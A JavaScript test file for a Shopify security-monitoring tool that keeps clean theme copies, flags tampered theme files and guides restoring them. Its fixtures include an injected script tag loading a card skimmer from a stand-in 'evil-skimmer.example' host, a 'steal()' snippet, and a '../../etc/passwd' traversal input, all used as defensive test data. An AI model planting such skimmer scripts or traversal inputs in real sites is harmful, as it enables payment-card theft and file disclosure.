// Clean theme copies and guided restore (S4). The first full check where the theme was read and no security check
// failed keeps that theme as the clean copy. After that the clean copy never moves forward on its own: a changed or
// newly published theme becomes the clean copy only when the owner confirms it (T90 review fix: T91); the three
// copies before it are kept. When a theme file changes, the report shows the clean
// version of each changed file to copy or download, the whole clean copy as a .zip, and the steps to paste it back
// in Shopify's code editor. Read-only: nothing is written to the store.
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import zlib from 'node:zlib';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { chromium } from 'playwright';
import { startProduct, shopifyOpen, shopifyToken, signup, addStore, runAndWait } from './lib/harness.js';
import { note, screenshot } from './lib/evidence.js';
import { check } from '../src/engine/checks.js';

const LAYOUT = '<!doctype html>\n<html>\n<head>\n{{ content_for_header }}\n</head>\n<body>\n{{ content_for_layout }}\n</body>\n</html>';
const HEADER = '<header>{{ shop.name }}</header>';
const BASE = { 'layout/theme.liquid': LAYOUT, 'sections/header.liquid': HEADER, 'assets/global.js': 'console.log(1);', 'assets/logo.png': null };
const HACKED = LAYOUT.replace('</head>', '<script src="https://evil-skimmer.example/cc.js"></script>\n</head>');

/** Reads a .zip (central directory) into { name: text }, checking each file's CRC. */
function unzip(buf) {
  const end = buf.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06]));
  assert.ok(end >= 0, 'end of central directory');
  const count = buf.readUInt16LE(end + 10);
  let p = buf.readUInt32LE(end + 16);
  const out = {};
  for (let i = 0; i < count; i++) {
    assert.equal(buf.readUInt32LE(p), 0x02014b50);
    const method = buf.readUInt16LE(p + 10), crc = buf.readUInt32LE(p + 16), csize = buf.readUInt32LE(p + 20);
    const nlen = buf.readUInt16LE(p + 28), xlen = buf.readUInt16LE(p + 30), clen = buf.readUInt16LE(p + 32), off = buf.readUInt32LE(p + 42);
    const name = buf.subarray(p + 46, p + 46 + nlen).toString('utf8');
    const lnlen = buf.readUInt16LE(off + 26), lxlen = buf.readUInt16LE(off + 28);
    const raw = buf.subarray(off + 30 + lnlen + lxlen, off + 30 + lnlen + lxlen + csize);
    const data = method === 8 ? zlib.inflateRawSync(raw) : raw;
    assert.equal(zlib.crc32(data), crc, `${name}: CRC`);
    out[name] = data.toString('utf8');
    p += 46 + nlen + xlen + clen;
  }
  return out;
}

describe('Clean theme copy: rules and .zip', () => {
  let tc;
  before(async () => {
    process.env.DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'tharam-clean-'));
    tc = await import('../src/theme-clean.js');
  });
  const theme = (status) => ({ ...check('sec.theme', 'security', 'Theme code unchanged', status, { severity: 'major' }), notice: true });

  it('a check is clean only when the theme is unchanged and no security check failed', () => {
    assert.equal(tc.isClean({ checks: [theme('pass'), check('fn.home', 'functional', 'Home', 'fail', { severity: 'critical' })] }), true, 'a broken journey doesn\'t make the theme unsafe');
    assert.equal(tc.isClean({ checks: [theme('fail')] }), false, 'theme changed');
    assert.equal(tc.isClean({ checks: [theme('skip')] }), false, 'theme not read');
    assert.equal(tc.isClean({ checks: [] }), false, 'theme not checked');
    assert.equal(tc.isClean({ checks: [theme('pass'), check('sec.scripts.bad', 'security', 'Bad scripts', 'fail', { severity: 'critical' })] }), false, 'a known-bad script is running');
    assert.equal(tc.isClean({ checks: [theme('pass'), check('sec.frames', 'security', 'Frames', 'warn', { severity: 'major' })] }), false);
    assert.equal(tc.isClean({ error: 'x', checks: [theme('pass')] }), false, 'a check that could not finish');
  });

  it('the .zip opens with every file and its folders, byte for byte', () => {
    const files = { 'layout/theme.liquid': LAYOUT, 'snippets/ünïcode.liquid': '<p>₹999 — sale</p>', 'assets/empty.css': '' };
    const z = tc.zip(Object.entries(files).map(([name, text]) => ({ name, data: Buffer.from(text) })));
    assert.deepEqual(unzip(z), files);
    assert.deepEqual(tc.zip([]).length, 22, 'an empty archive is still a valid .zip');
  });
});

describe('Clean theme copy and guided restore', () => {
  let P, owner, storeId, hackedRun, firstRun;
  const shop = 'theme-clean.myshopify.com';
  const files = (f) => P.fake.control({ themeFiles: f });
  const full = async () => {
    const r = await runAndWait(owner, storeId, { groups: ['security.theme'] });
    assert.equal(r.status, 'done', r.error || '');
    return r;
  };
  const clean = async (s = owner, id = storeId) => (await s.get(`/api/stores/${id}/theme/clean`)).json?.clean;
  const zipOf = async (id = storeId) => fetch(`${P.base}/api/stores/${id}/theme/clean.zip`, { headers: { authorization: `Bearer ${shopifyToken(shop)}` } });

  before(async () => {
    P = await startProduct();
    owner = await shopifyOpen(P, shop);
    storeId = owner.storeId;
    await files(BASE);
  });
  after(async () => { await P?.stop(); });

  it('no clean copy before the first full check', async () => {
    assert.equal(await clean(), null);
    const z = await zipOf();
    assert.equal(z.status, 404);
    assert.equal((await z.json()).error, 'There is no clean copy of your theme yet.');
  });

  it('a clean full check keeps the theme as the clean copy', async (t) => {
    firstRun = await full();
    const c = await clean();
    assert.equal(c.themeName, 'Dawn');
    assert.equal(c.runId, firstRun.id);
    assert.equal(c.sameTheme, true);
    assert.deepEqual(c.files.map((f) => [f.filename, f.state, f.stored]), [
      ['assets/global.js', 'same', true], ['assets/logo.png', 'same', false], ['layout/theme.liquid', 'same', true], ['sections/header.liquid', 'same', true],
    ]);
    assert.deepEqual(c.added, []);
    note(t, `Clean copy of “${c.themeName}” saved from check #${c.runId}: ${c.files.length} files (images fingerprinted only).`);
  });

  it('a changed theme does not replace the clean copy; the changed and new files are shown against it', async (t) => {
    await files({ ...BASE, 'layout/theme.liquid': HACKED, 'snippets/x.liquid': '<script>steal()</script>' });
    hackedRun = await full();
    assert.equal(hackedRun.result.checks.find((c) => c.id === 'sec.theme').status, 'fail');
    const c = await clean();
    assert.equal(c.runId, firstRun.id, 'still the clean copy from before the change');
    assert.equal(c.files.find((f) => f.filename === 'layout/theme.liquid').state, 'changed');
    assert.equal(c.files.find((f) => f.filename === 'sections/header.liquid').state, 'same');
    assert.deepEqual(c.added, ['snippets/x.liquid']);
    note(t, 'layout/theme.liquid shows as changed since the clean copy; snippets/x.liquid as a new file.');
  });

  it('the next check does not take the changed theme as clean, even though it reports no new change', async (t) => {
    const again = await full();
    assert.equal(again.result.checks.find((c) => c.id === 'sec.theme').status, 'pass', 'same as at the last check');
    const c = await clean();
    assert.equal(c.runId, firstRun.id, 'the clean copy from before the change is kept');
    assert.equal(c.confirmedBy, 'first check');
    assert.equal(c.pending, true, 'the theme still differs from the clean copy');
    assert.equal(c.files.find((f) => f.filename === 'layout/theme.liquid').state, 'changed');
    const f = await owner.get(`/api/stores/${storeId}/theme/clean/file?name=${encodeURIComponent('layout/theme.liquid')}`);
    assert.equal(f.json.content, LAYOUT, 'no skimmer in the clean copy');
    note(t, `Check #${again.id} passed theme watch ("same as last check"), and the clean copy is still the one from check #${firstRun.id}.`);
  });

  it('the clean version of a file is there to copy, and only for text files in the clean copy', async () => {
    const f = await owner.get(`/api/stores/${storeId}/theme/clean/file?name=${encodeURIComponent('layout/theme.liquid')}`);
    assert.equal(f.status, 200);
    assert.equal(f.json.content, LAYOUT, 'the version from before the change');
    for (const name of ['assets/logo.png', 'snippets/x.liquid', '../../etc/passwd', '']) {
      const r = await owner.get(`/api/stores/${storeId}/theme/clean/file?name=${encodeURIComponent(name)}`);
      assert.equal(r.status, 404, name);
      assert.equal(r.json.error, 'This file isn’t in the clean copy.');
    }
  });

  it('the whole clean copy downloads as a .zip with the theme\'s folders', async (t) => {
    const z = await zipOf();
    assert.equal(z.status, 200);
    assert.equal(z.headers.get('content-type'), 'application/zip');
    assert.match(z.headers.get('content-disposition'), /^attachment; filename="Dawn-clean-\d{4}-\d{2}-\d{2}\.zip"$/);
    const files = unzip(Buffer.from(await z.arrayBuffer()));
    assert.deepEqual(files, { 'assets/global.js': 'console.log(1);', 'layout/theme.liquid': LAYOUT, 'sections/header.liquid': HEADER });
    note(t, `${z.headers.get('content-disposition')}: ${Object.keys(files).join(', ')}`);
  });

  it('the report shows how to undo the change, and copies the clean version', async (t) => {
    assert.equal((await owner.patch(`/api/stores/${storeId}`, { config: { onboarded: true, toured: true } })).status, 200);
    const browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || undefined, args: ['--no-sandbox'] });
    try {
      const ctx = await browser.newContext({ viewport: { width: 1360, height: 1100 } });
      await ctx.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: P.base });
      const p = await ctx.newPage();
      const errors = [];
      p.on('pageerror', (e) => errors.push(e.message));
      await p.route('https://cdn.shopify.com/**', (r) => r.fulfill({ contentType: 'text/javascript', body: `window.shopify={idToken:async()=>${JSON.stringify(shopifyToken(shop, { expIn: 600 }))}};` }));
      await p.goto(`${P.base}/shopify?shop=${shop}#/s/${storeId}/reports/${hackedRun.id}`);
      await p.waitForSelector('[data-rtab=areas]', { timeout: 20000 });
      await p.evaluate(() => document.querySelectorAll('.tour,.tour-mask,.toast').forEach((x) => x.remove()));
      await p.click('[data-rtab=areas]');
      const box = p.locator('tr[data-check="sec.theme"] .theme-restore');
      await box.locator('h4').waitFor({ timeout: 10000 });
      const text = await box.textContent();
      assert.match(text, /Undo a change you didn't make/);
      assert.match(text, /Online Store → Themes/);
      assert.match(text, /Not in the clean copy: if you didn't add it, delete this file/);
      await box.locator('[data-clean-copy="layout/theme.liquid"]').click();
      await p.waitForSelector('.toast', { timeout: 5000 });
      assert.equal(await p.evaluate(() => navigator.clipboard.readText()), LAYOUT, 'the clean version is on the clipboard');
      const [dl] = await Promise.all([p.waitForEvent('download'), box.locator('[data-clean-zip]').click()]);
      assert.match(dl.suggestedFilename(), /^Dawn-clean-\d{4}-\d{2}-\d{2}\.zip$/);
      await box.scrollIntoViewIfNeeded();
      await screenshot(t, p, 'Theme change with the clean copy and restore steps');
      assert.deepEqual(errors, []);
    } finally { await browser.close(); }
  });

  it('after the owner pastes the clean version back, the next clean check refreshes the clean copy', async () => {
    await files(BASE);
    const r = await full();
    assert.equal(r.result.checks.find((c) => c.id === 'sec.theme').status, 'fail', 'the change back is reported once too');
    assert.equal((await clean()).runId, firstRun.id, 'not clean yet: the theme changed in this check');
    const r2 = await full();
    assert.equal(r2.result.checks.find((c) => c.id === 'sec.theme').status, 'pass');
    const c = await clean();
    assert.equal(c.runId, r2.id, 'clean again: this check is the new clean copy');
    assert.ok(c.files.every((f) => f.state === 'same'));
  });

  it('a newly published theme never becomes the clean copy on its own', async (t) => {
    await P.fake.control({ mainTheme: { id: 'gid://shopify/OnlineStoreTheme/333', name: 'Dawn copy' } });
    const before = await clean();
    const r1 = await full();
    const r2 = await full();
    assert.equal(r2.result.checks.find((c) => c.id === 'sec.theme').status, 'pass');
    const c = await clean();
    assert.equal(c.themeName, 'Dawn', 'still the clean copy of the old theme');
    assert.equal(c.runId, before.runId);
    assert.equal(c.sameTheme, false);
    assert.equal(c.pending, true);
    note(t, `After publishing “Dawn copy” (checks #${r1.id} and #${r2.id}), the clean copy is still “${c.themeName}” from check #${c.runId}.`);
  });

  it('the owner confirms a change they made: it becomes the clean copy, the old one is kept', async (t) => {
    const before = await clean();
    const r = await owner.post(`/api/stores/${storeId}/theme/clean/confirm`, {});
    assert.equal(r.status, 200, r.text);
    const c = r.json.clean;
    assert.equal(c.themeName, 'Dawn copy');
    assert.equal(c.confirmedBy, 'owner');
    assert.equal(c.pending, false);
    assert.ok(c.files.every((f) => f.state === 'same'));
    assert.equal(c.older.length, 1);
    assert.equal(c.older[0].themeName, before.themeName);
    assert.equal(c.older[0].confirmedBy, 'first check');
    const again = await owner.post(`/api/stores/${storeId}/theme/clean/confirm`, {});
    assert.equal(again.status, 409);
    assert.equal(again.json.error, 'Your theme already matches the clean copy. There is nothing to confirm.');
    note(t, `Confirmed: clean copy is now “${c.themeName}” (by the owner); the previous copy “${c.older[0].themeName}” is kept.`);
  });

  it('keeps the three copies before the current one', async () => {
    for (let i = 1; i <= 4; i++) {
      await files({ ...BASE, 'sections/header.liquid': `<header>{{ shop.name }} v${i}</header>` });
      await full();
      const r = await owner.post(`/api/stores/${storeId}/theme/clean/confirm`, {});
      assert.equal(r.status, 200, r.text);
    }
    const c = await clean();
    assert.equal(c.older.length, 3);
    const f = await owner.get(`/api/stores/${storeId}/theme/clean/file?name=${encodeURIComponent('sections/header.liquid')}`);
    assert.equal(f.json.content, '<header>{{ shop.name }} v4</header>');
  });

  it('the report offers "I made this change" while the theme differs from the clean copy', async (t) => {
    await files({ ...BASE, 'sections/header.liquid': '<header>{{ shop.name }} new menu</header>' });
    await full();
    const passRun = await full();
    assert.equal(passRun.result.checks.find((c) => c.id === 'sec.theme').status, 'pass');
    const browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || undefined, args: ['--no-sandbox'] });
    try {
      const ctx = await browser.newContext({ viewport: { width: 1360, height: 1100 } });
      const p = await ctx.newPage();
      const errors = [];
      p.on('pageerror', (e) => errors.push(e.message));
      await p.route('https://cdn.shopify.com/**', (r) => r.fulfill({ contentType: 'text/javascript', body: `window.shopify={idToken:async()=>${JSON.stringify(shopifyToken(shop, { expIn: 600 }))}};` }));
      await p.goto(`${P.base}/shopify?shop=${shop}#/s/${storeId}/reports/${passRun.id}`);
      await p.waitForSelector('[data-rtab=areas]', { timeout: 20000 });
      await p.evaluate(() => document.querySelectorAll('.tour,.tour-mask,.toast').forEach((x) => x.remove()));
      await p.click('[data-rtab=areas]');
      const box = p.locator('tr[data-check="sec.theme"] .theme-restore');
      await box.locator('[data-clean-confirm]').waitFor({ state: 'attached', timeout: 10000 });
      await p.evaluate(() => document.querySelectorAll('details').forEach((d) => (d.open = true))); // passed checks are folded away
      const btn = box.locator('[data-clean-confirm]');
      await btn.waitFor({ timeout: 10000 });
      assert.match(await box.textContent(), /We never replace the clean copy on our own/);
      await btn.click();
      assert.match(await btn.textContent(), /Press again to confirm/);
      assert.equal((await clean()).pending, true, 'one press does nothing yet');
      await box.scrollIntoViewIfNeeded();
      await screenshot(t, p, 'Theme differs from the clean copy: the owner can confirm the change');
      await btn.click();
      await box.locator('text=The theme as it is now is your clean copy').waitFor({ timeout: 10000 });
      assert.equal((await clean()).pending, false);
      assert.deepEqual(errors, []);
    } finally { await browser.close(); }
  });

  it('other accounts, and stores without a Shopify connection, get nothing', async () => {
    const other = await signup(P, 'clean-other@shop.test');
    const otherStore = await addStore(P, other, { runNow: false });
    assert.equal(await clean(other, otherStore), null, 'a website store has no theme record');
    for (const u of [`/api/stores/${storeId}/theme/clean`, `/api/stores/${storeId}/theme/clean/file?name=layout%2Ftheme.liquid`, `/api/stores/${storeId}/theme/clean.zip`]) {
      assert.equal((await other.get(u)).status, 404, u);
      assert.equal((await P.session().get(u)).status, 401, u);
    }
    const u = `/api/stores/${storeId}/theme/clean/confirm`;
    assert.equal((await other.post(u, {})).status, 404);
    assert.equal((await P.session().post(u, {})).status, 401);
  });
});
